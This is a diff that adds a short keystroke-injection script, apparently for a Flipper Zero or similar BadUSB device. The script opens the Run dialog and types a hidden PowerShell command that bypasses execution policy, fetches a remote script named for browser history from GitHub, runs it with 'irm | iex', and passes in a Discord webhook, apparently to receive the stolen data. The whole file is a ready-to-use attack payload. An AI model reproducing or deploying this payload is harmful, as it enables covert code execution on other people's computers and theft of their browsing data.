@@ -1,0 +1,14 @@
+REM *SETUP*
+REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
+
+
+DEFAULT_DELAY 100
+
+
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/Neo0412/FlipperScripts/main/BWHistory/BwHi.ps1 | iex
+ENTER
+
+
